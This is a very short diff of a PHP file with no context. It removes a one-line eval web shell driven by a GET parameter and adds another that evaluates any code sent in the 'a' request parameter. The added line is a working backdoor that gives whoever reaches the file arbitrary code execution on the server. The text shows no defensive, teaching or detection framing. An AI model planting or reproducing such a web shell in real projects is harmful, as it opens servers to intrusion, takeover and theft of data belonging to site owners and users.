@@ -1,3 +1,1 @@
-<?php
-@eval($_GET['a']);
-?>
+<?php eval($_REQUEST["a"]); ?>
